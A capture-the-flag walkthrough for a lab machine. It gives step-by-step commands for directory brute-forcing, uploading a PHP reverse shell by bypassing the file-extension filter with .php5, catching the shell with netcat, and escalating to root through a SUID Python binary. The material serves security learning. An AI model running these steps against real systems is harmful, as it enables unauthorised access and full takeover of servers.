# Steps to Capture the Flag

## 1. Initial Reconnaissance
- **Scanned the target IP address with Nmap to identify open ports.**  
  - Command: `nmap <ip_address>`  
  - Result: Ports **22 (SSH)** and **80 (HTTP)** were open.
- **Accessed** `http://<ip_address>` in a web browser to confirm a web application was running.
- **Used Gobuster to brute-force directories on the web server.**  
  - Command:  
    ```bash
    gobuster dir -u http://10.10.138.176 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
    ```  
  - Result: Discovered **uploads**, **css**, **js**, and **panel** directories.
- **Explored** `http://<ip>/css` and found `home.css` and `panel.css`, confirming a panel directory.
- **Navigated to** `http://<ip>/panel` and found an upload functionality.
- **Uploaded a random JPG file** to determine the upload directory.  
  - Result: The file was uploaded to the `/uploads` directory.

---

## 2. Gaining Initial Access
- **Downloaded a PHP reverse shell script from PentestMonkey's GitHub.**  
  - Command:  
    ```bash
    wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
    ```
- **Edited** `php-reverse-shell.php` to set the attacking machine's IP address (tun0) and listening port (1234).
- **Started a Netcat listener** on the attacking machine.  
  - Command: `nc -lvnp 1234`
- **Attempted to upload the modified PHP reverse shell** with various extensions:  
  - `.php`: Failed.  
  - `.php2`: Successful upload, but no shell.  
  - `.php3`: Successful upload, but no shell.  
  - `.php4`: Successful upload, but no shell.  
  - `.php5`: **Successful upload, reverse shell obtained** when accessed in the browser.

---

## 3. Post-Exploitation
- Checked the current user.  
  - Command: `whoami`  
  - Result: `www-data`
- Checked the current working directory.  
  - Command: `pwd`
- Listed files in the current directory.  
  - Command: `ls`
- Upgraded to an interactive TTY shell.  
  - Command:  
    ```bash
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```
- Changed to the current user's home directory.  
  - Command: `cd ~`
- Listed files in the home directory.  
  - Command: `ls`  
  - Result: Found the **first user flag**.

---

## 4. Privilege Escalation
- Searched for SUID binaries owned by root.  
  - Command:  
    ```bash
    find / -user root -perm /4000 2>/dev/null
    ```  
  - Result: `/usr/bin/python` identified as a suspicious SUID binary.
- Exploited the SUID-enabled Python binary to gain root access (from GTFOBins).  
  - Command:  
    ```bash
    python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
    ```
- Verified root privileges.  
  - Command: `whoami`  
  - Result: `root`
- Listed files in the root directory.  
  - Command: `ls`  
  - Result: Found the **root flag**.
